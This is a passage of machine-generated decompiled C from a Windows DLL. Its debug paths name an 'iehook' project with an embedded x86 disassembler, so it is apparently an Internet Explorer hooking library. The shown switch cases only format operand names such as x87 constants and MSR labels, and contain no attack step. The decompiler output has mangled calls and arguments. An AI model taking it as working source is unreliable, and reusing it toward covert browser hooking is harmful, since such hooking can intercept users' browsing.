                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 54: {
                        // 0x10006b7d
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            char * v416 = (char *)(v79 + 4); // 0x10006b87
                            *v416 = *v416 & -64 | 3;
                            *(int16_t *)(v79 + 6) = 10;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v417 = *v18; // 0x10006ba6
                                int32_t v418 = v417; // 0x10006ba6
                                int32_t * v419 = (int32_t *)(v63 - 4); // 0x10006bbf
                                *v419 = (int32_t)"<0.0>";
                                int32_t * v420 = (int32_t *)(v63 - 8); // 0x10006bc4
                                *v420 = v417 == -1 ? 0 : 256 - v418;
                                int32_t * v421 = (int32_t *)(v63 - 12); // 0x10006bcc
                                *v421 = v19 + v418;
                                int32_t v422 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10006bcd
                                unsigned char v423 = *v18 + (char)v422; // 0x10006bd2
                                *v18 = v423;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10006beb
                                    *(char *)(v19 + (int32_t)v423) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v424 = (int32_t *)v79; // 0x10006bf9
                                    int32_t v425 = *v424; // 0x10006bf9
                                    int32_t v426 = v425; // 0x10006bff
                                    if ((v425 & 0xe000) == 0) {
                                        // 0x10006c01
                                        *v419 = 3160;
                                        *v420 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v421 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v426 = *v424;
                                    }
                                    int32_t v427 = v426; // 0x10006c1e
                                    if ((v426 & 0x200000) != 0) {
                                        // 0x10006c20
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v427 = *v424;
                                    }
                                    int32_t v428 = v427; // 0x10006c38
                                    if ((v427 & 0x100000) != 0) {
                                        // 0x10006c3a
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v428 = *v424;
                                    }
                                    int32_t v429 = v428; // 0x10006c52
                                    if ((v428 & 1024) != 0) {
                                        // 0x10006c54
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v429 = *v424;
                                    }
                                    // 0x10006c66
                                    v72 = v69;
                                    v61 = v429;
                                    v65 = v63;
                                    if ((int16_t)v429 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10006c73
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 55: {
                        // 0x10006c84
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            char * v430 = (char *)(v79 + 4); // 0x10006c8e
                            *v430 = *v430 & -64 | 3;
                            *(int16_t *)(v79 + 6) = 10;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v431 = *v18; // 0x10006cad
                                int32_t v432 = v431; // 0x10006cad
                                int32_t * v433 = (int32_t *)(v63 - 4); // 0x10006cc6
                                *v433 = (int32_t)"<1.0>";
                                int32_t * v434 = (int32_t *)(v63 - 8); // 0x10006ccb
                                *v434 = v431 == -1 ? 0 : 256 - v432;
                                int32_t * v435 = (int32_t *)(v63 - 12); // 0x10006cd3
                                *v435 = v19 + v432;
                                int32_t v436 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10006cd4
                                unsigned char v437 = *v18 + (char)v436; // 0x10006cd9
                                *v18 = v437;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10006cf2
                                    *(char *)(v19 + (int32_t)v437) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v438 = (int32_t *)v79; // 0x10006d00
                                    int32_t v439 = *v438; // 0x10006d00
                                    int32_t v440 = v439; // 0x10006d06
                                    if ((v439 & 0xe000) == 0) {
                                        // 0x10006d08
                                        *v433 = 3170;
                                        *v434 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v435 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v440 = *v438;
                                    }
                                    int32_t v441 = v440; // 0x10006d25
                                    if ((v440 & 0x200000) != 0) {
                                        // 0x10006d27
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v441 = *v438;
                                    }
                                    int32_t v442 = v441; // 0x10006d3f
                                    if ((v441 & 0x100000) != 0) {
                                        // 0x10006d41
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v442 = *v438;
                                    }
                                    int32_t v443 = v442; // 0x10006d59
                                    if ((v442 & 1024) != 0) {
                                        // 0x10006d5b
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v443 = *v438;
                                    }
                                    // 0x10006d6d
                                    v72 = v69;
                                    v61 = v443;
                                    v65 = v63;
                                    if ((int16_t)v443 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10006d7a
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 56: {
                        // 0x10006d8b
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            char * v444 = (char *)(v79 + 4); // 0x10006d95
                            *v444 = *v444 & -64 | 3;
                            *(int16_t *)(v79 + 6) = 10;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v445 = *v18; // 0x10006db4
                                int32_t v446 = v445; // 0x10006db4
                                int32_t * v447 = (int32_t *)(v63 - 4); // 0x10006dcd
                                *v447 = (int32_t)"<pi>";
                                int32_t * v448 = (int32_t *)(v63 - 8); // 0x10006dd2
                                *v448 = v445 == -1 ? 0 : 256 - v446;
                                int32_t * v449 = (int32_t *)(v63 - 12); // 0x10006dda
                                *v449 = v19 + v446;
                                int32_t v450 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10006ddb
                                unsigned char v451 = *v18 + (char)v450; // 0x10006de0
                                *v18 = v451;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10006df9
                                    *(char *)(v19 + (int32_t)v451) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v452 = (int32_t *)v79; // 0x10006e07
                                    int32_t v453 = *v452; // 0x10006e07
                                    int32_t v454 = v453; // 0x10006e0d
                                    if ((v453 & 0xe000) == 0) {
                                        // 0x10006e0f
                                        *v447 = 3180;
                                        *v448 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v449 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v454 = *v452;
                                    }
                                    int32_t v455 = v454; // 0x10006e2c
                                    if ((v454 & 0x200000) != 0) {
                                        // 0x10006e2e
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v455 = *v452;
                                    }
                                    int32_t v456 = v455; // 0x10006e46
                                    if ((v455 & 0x100000) != 0) {
                                        // 0x10006e48
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v456 = *v452;
                                    }
                                    int32_t v457 = v456; // 0x10006e60
                                    if ((v456 & 1024) != 0) {
                                        // 0x10006e62
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v457 = *v452;
                                    }
                                    // 0x10006e74
                                    v72 = v69;
                                    v61 = v457;
                                    v65 = v63;
                                    if ((int16_t)v457 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10006e81
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 57: {
                        // 0x10006e92
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            char * v458 = (char *)(v79 + 4); // 0x10006e9c
                            *v458 = *v458 & -64 | 3;
                            *(int16_t *)(v79 + 6) = 10;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v459 = *v18; // 0x10006ebb
                                int32_t v460 = v459; // 0x10006ebb
                                int32_t * v461 = (int32_t *)(v63 - 4); // 0x10006ed4
                                *v461 = (int32_t)"<log_2 10>";
                                int32_t * v462 = (int32_t *)(v63 - 8); // 0x10006ed9
                                *v462 = v459 == -1 ? 0 : 256 - v460;
                                int32_t * v463 = (int32_t *)(v63 - 12); // 0x10006ee1
                                *v463 = v19 + v460;
                                int32_t v464 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10006ee2
                                unsigned char v465 = *v18 + (char)v464; // 0x10006ee7
                                *v18 = v465;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10006f00
                                    *(char *)(v19 + (int32_t)v465) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v466 = (int32_t *)v79; // 0x10006f0e
                                    int32_t v467 = *v466; // 0x10006f0e
                                    int32_t v468 = v467; // 0x10006f14
                                    if ((v467 & 0xe000) == 0) {
                                        // 0x10006f16
                                        *v461 = 3190;
                                        *v462 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v463 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v468 = *v466;
                                    }
                                    int32_t v469 = v468; // 0x10006f33
                                    if ((v468 & 0x200000) != 0) {
                                        // 0x10006f35
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v469 = *v466;
                                    }
                                    int32_t v470 = v469; // 0x10006f4d
                                    if ((v469 & 0x100000) != 0) {
                                        // 0x10006f4f
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v470 = *v466;
                                    }
                                    int32_t v471 = v470; // 0x10006f67
                                    if ((v470 & 1024) != 0) {
                                        // 0x10006f69
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v471 = *v466;
                                    }
                                    // 0x10006f7b
                                    v72 = v69;
                                    v61 = v471;
                                    v65 = v63;
                                    if ((int16_t)v471 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10006f88
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 58: {
                        // 0x10006f99
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            char * v472 = (char *)(v79 + 4); // 0x10006fa3
                            *v472 = *v472 & -64 | 3;
                            *(int16_t *)(v79 + 6) = 10;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v473 = *v18; // 0x10006fc2
                                int32_t v474 = v473; // 0x10006fc2
                                int32_t * v475 = (int32_t *)(v63 - 4); // 0x10006fdb
                                *v475 = (int32_t)"<log_2 e>";
                                int32_t * v476 = (int32_t *)(v63 - 8); // 0x10006fe0
                                *v476 = v473 == -1 ? 0 : 256 - v474;
                                int32_t * v477 = (int32_t *)(v63 - 12); // 0x10006fe8
                                *v477 = v19 + v474;
                                int32_t v478 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10006fe9
                                unsigned char v479 = *v18 + (char)v478; // 0x10006fee
                                *v18 = v479;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10007007
                                    *(char *)(v19 + (int32_t)v479) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v480 = (int32_t *)v79; // 0x10007015
                                    int32_t v481 = *v480; // 0x10007015
                                    int32_t v482 = v481; // 0x1000701b
                                    if ((v481 & 0xe000) == 0) {
                                        // 0x1000701d
                                        *v475 = 3200;
                                        *v476 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v477 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v482 = *v480;
                                    }
                                    int32_t v483 = v482; // 0x1000703a
                                    if ((v482 & 0x200000) != 0) {
                                        // 0x1000703c
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v483 = *v480;
                                    }
                                    int32_t v484 = v483; // 0x10007054
                                    if ((v483 & 0x100000) != 0) {
                                        // 0x10007056
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v484 = *v480;
                                    }
                                    int32_t v485 = v484; // 0x1000706e
                                    if ((v484 & 1024) != 0) {
                                        // 0x10007070
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v485 = *v480;
                                    }
                                    // 0x10007082
                                    v72 = v69;
                                    v61 = v485;
                                    v65 = v63;
                                    if ((int16_t)v485 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x1000708f
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 59: {
                        // 0x100070a0
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            char * v486 = (char *)(v79 + 4); // 0x100070aa
                            *v486 = *v486 & -64 | 3;
                            *(int16_t *)(v79 + 6) = 10;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v487 = *v18; // 0x100070c9
                                int32_t v488 = v487; // 0x100070c9
                                int32_t * v489 = (int32_t *)(v63 - 4); // 0x100070e2
                                *v489 = (int32_t)"<log_10 2>";
                                int32_t * v490 = (int32_t *)(v63 - 8); // 0x100070e7
                                *v490 = v487 == -1 ? 0 : 256 - v488;
                                int32_t * v491 = (int32_t *)(v63 - 12); // 0x100070ef
                                *v491 = v19 + v488;
                                int32_t v492 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100070f0
                                unsigned char v493 = *v18 + (char)v492; // 0x100070f5
                                *v18 = v493;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x1000710e
                                    *(char *)(v19 + (int32_t)v493) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v494 = (int32_t *)v79; // 0x1000711c
                                    int32_t v495 = *v494; // 0x1000711c
                                    int32_t v496 = v495; // 0x10007122
                                    if ((v495 & 0xe000) == 0) {
                                        // 0x10007124
                                        *v489 = 3210;
                                        *v490 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v491 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v496 = *v494;
                                    }
                                    int32_t v497 = v496; // 0x10007141
                                    if ((v496 & 0x200000) != 0) {
                                        // 0x10007143
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v497 = *v494;
                                    }
                                    int32_t v498 = v497; // 0x1000715b
                                    if ((v497 & 0x100000) != 0) {
                                        // 0x1000715d
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v498 = *v494;
                                    }
                                    int32_t v499 = v498; // 0x10007175
                                    if ((v498 & 1024) != 0) {
                                        // 0x10007177
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v499 = *v494;
                                    }
                                    // 0x10007189
                                    v72 = v69;
                                    v61 = v499;
                                    v65 = v63;
                                    if ((int16_t)v499 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10007196
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 60: {
                        // 0x100071a7
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            char * v500 = (char *)(v79 + 4); // 0x100071b1
                            *v500 = *v500 & -64 | 3;
                            *(int16_t *)(v79 + 6) = 10;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v501 = *v18; // 0x100071d0
                                int32_t v502 = v501; // 0x100071d0
                                int32_t * v503 = (int32_t *)(v63 - 4); // 0x100071e9
                                *v503 = (int32_t)"<ln 2>";
                                int32_t * v504 = (int32_t *)(v63 - 8); // 0x100071ee
                                *v504 = v501 == -1 ? 0 : 256 - v502;
                                int32_t * v505 = (int32_t *)(v63 - 12); // 0x100071f6
                                *v505 = v19 + v502;
                                int32_t v506 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100071f7
                                unsigned char v507 = *v18 + (char)v506; // 0x100071fc
                                *v18 = v507;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10007215
                                    *(char *)(v19 + (int32_t)v507) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v508 = (int32_t *)v79; // 0x10007223
                                    int32_t v509 = *v508; // 0x10007223
                                    int32_t v510 = v509; // 0x10007229
                                    if ((v509 & 0xe000) == 0) {
                                        // 0x1000722b
                                        *v503 = 3220;
                                        *v504 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v505 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v510 = *v508;
                                    }
                                    int32_t v511 = v510; // 0x10007248
                                    if ((v510 & 0x200000) != 0) {
                                        // 0x1000724a
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v511 = *v508;
                                    }
                                    int32_t v512 = v511; // 0x10007262
                                    if ((v511 & 0x100000) != 0) {
                                        // 0x10007264
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v512 = *v508;
                                    }
                                    int32_t v513 = v512; // 0x1000727c
                                    if ((v512 & 1024) != 0) {
                                        // 0x1000727e
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v513 = *v508;
                                    }
                                    // 0x10007290
                                    v72 = v69;
                                    v61 = v513;
                                    v65 = v63;
                                    if ((int16_t)v513 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x1000729d
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 64: {
                        // 0x10003a35
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10003a3f
                            *(int16_t *)(v79 + 6) = 8;
                            char * v514 = (char *)(v79 + 4); // 0x10003a48
                            *v514 = *v514 & -64 | 6;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v515 = *v18; // 0x10003a5e
                                int32_t v516 = v515; // 0x10003a5e
                                int32_t * v517 = (int32_t *)(v63 - 4); // 0x10003a77
                                *v517 = (int32_t)"<CS_MSR>";
                                int32_t * v518 = (int32_t *)(v63 - 8); // 0x10003a7c
                                *v518 = v515 == -1 ? 0 : 256 - v516;
                                int32_t * v519 = (int32_t *)(v63 - 12); // 0x10003a84
                                *v519 = v19 + v516;
                                int32_t v520 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10003a85
                                unsigned char v521 = *v18 + (char)v520; // 0x10003a8a
                                *v18 = v521;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10003aa3
                                    *(char *)(v19 + (int32_t)v521) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v522 = (int32_t *)v79; // 0x10003ab1
                                    int32_t v523 = *v522; // 0x10003ab1
                                    int32_t v524 = v523; // 0x10003ab7
                                    if ((v523 & 0xe000) == 0) {
                                        // 0x10003ab9
                                        *v517 = 2638;
                                        *v518 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v519 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v524 = *v522;
                                    }
                                    int32_t v525 = v524; // 0x10003ad6
                                    if ((v524 & 0x200000) != 0) {
                                        // 0x10003ad8
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v525 = *v522;
                                    }
                                    int32_t v526 = v525; // 0x10003af0
                                    if ((v525 & 0x100000) != 0) {
                                        // 0x10003af2
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v526 = *v522;
                                    }
                                    int32_t v527 = v526; // 0x10003b0a
                                    if ((v526 & 1024) != 0) {
                                        // 0x10003b0c
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v527 = *v522;
                                    }
                                    // 0x10003b1e
                                    v72 = v69;
                                    v61 = v527;
                                    v65 = v63;
                                    if ((int16_t)v527 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10003b2b
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 65: {
                        // 0x10003b3c
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10003b46
                            *(int16_t *)(v79 + 6) = 8;
                            char * v528 = (char *)(v79 + 4); // 0x10003b4f
                            *v528 = *v528 & -64 | 6;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v529 = *v18; // 0x10003b65
                                int32_t v530 = v529; // 0x10003b65
                                int32_t * v531 = (int32_t *)(v63 - 4); // 0x10003b7e
                                *v531 = (int32_t)"<EIP_MSR>";
                                int32_t * v532 = (int32_t *)(v63 - 8); // 0x10003b83
                                *v532 = v529 == -1 ? 0 : 256 - v530;
                                int32_t * v533 = (int32_t *)(v63 - 12); // 0x10003b8b
                                *v533 = v19 + v530;
                                int32_t v534 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10003b8c
                                unsigned char v535 = *v18 + (char)v534; // 0x10003b91
                                *v18 = v535;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10003baa
                                    *(char *)(v19 + (int32_t)v535) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v536 = (int32_t *)v79; // 0x10003bb8
                                    int32_t v537 = *v536; // 0x10003bb8
                                    int32_t v538 = v537; // 0x10003bbe
                                    if ((v537 & 0xe000) == 0) {
                                        // 0x10003bc0
                                        *v531 = 2649;
                                        *v532 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v533 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v538 = *v536;
                                    }
                                    int32_t v539 = v538; // 0x10003bdd
                                    if ((v538 & 0x200000) != 0) {
                                        // 0x10003bdf
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v539 = *v536;
                                    }
                                    int32_t v540 = v539; // 0x10003bf7
                                    if ((v539 & 0x100000) != 0) {
                                        // 0x10003bf9
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v540 = *v536;
                                    }
                                    int32_t v541 = v540; // 0x10003c11
                                    if ((v540 & 1024) != 0) {
                                        // 0x10003c13
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v541 = *v536;
                                    }
                                    // 0x10003c25
                                    v72 = v69;
                                    v61 = v541;
                                    v65 = v63;
                                    if ((int16_t)v541 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10003c32
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 66: {
                        // 0x10003c43
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10003c4d
                            *(int16_t *)(v79 + 6) = 8;
                            char * v542 = (char *)(v79 + 4); // 0x10003c56
                            *v542 = *v542 & -64 | 6;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v543 = *v18; // 0x10003c6c
                                int32_t v544 = v543; // 0x10003c6c
                                int32_t * v545 = (int32_t *)(v63 - 4); // 0x10003c85
                                *v545 = (int32_t)"<ESP_MSR>";
                                int32_t * v546 = (int32_t *)(v63 - 8); // 0x10003c8a
                                *v546 = v543 == -1 ? 0 : 256 - v544;
                                int32_t * v547 = (int32_t *)(v63 - 12); // 0x10003c92
                                *v547 = v19 + v544;
                                int32_t v548 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10003c93
                                unsigned char v549 = *v18 + (char)v548; // 0x10003c98
                                *v18 = v549;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10003cb1
                                    *(char *)(v19 + (int32_t)v549) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v550 = (int32_t *)v79; // 0x10003cbf
                                    int32_t v551 = *v550; // 0x10003cbf
                                    int32_t v552 = v551; // 0x10003cc5
                                    if ((v551 & 0xe000) == 0) {
                                        // 0x10003cc7
                                        *v545 = 2660;
                                        *v546 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v547 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v552 = *v550;
                                    }
                                    int32_t v553 = v552; // 0x10003ce4
                                    if ((v552 & 0x200000) != 0) {
                                        // 0x10003ce6
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v553 = *v550;
                                    }
                                    int32_t v554 = v553; // 0x10003cfe
                                    if ((v553 & 0x100000) != 0) {
                                        // 0x10003d00
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v554 = *v550;
                                    }
                                    int32_t v555 = v554; // 0x10003d18
                                    if ((v554 & 1024) != 0) {
                                        // 0x10003d1a
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v555 = *v550;
                                    }
                                    // 0x10003d2c
                                    v72 = v69;
                                    v61 = v555;
                                    v65 = v63;
                                    if ((int16_t)v555 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10003d39
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 67: {
                        // 0x10003d4a
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10003d54
                            *(int16_t *)(v79 + 6) = 8;
                            char * v556 = (char *)(v79 + 4); // 0x10003d5d
                            *v556 = *v556 & -64 | 6;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v557 = *v18; // 0x10003d73
                                int32_t v558 = v557; // 0x10003d73
                                int32_t * v559 = (int32_t *)(v63 - 4); // 0x10003d8c
                                *v559 = (int32_t)"<KRNLBASE_MSR>";
                                int32_t * v560 = (int32_t *)(v63 - 8); // 0x10003d91
                                *v560 = v557 == -1 ? 0 : 256 - v558;
                                int32_t * v561 = (int32_t *)(v63 - 12); // 0x10003d99
                                *v561 = v19 + v558;
                                int32_t v562 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10003d9a
                                unsigned char v563 = *v18 + (char)v562; // 0x10003d9f
                                *v18 = v563;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10003db8
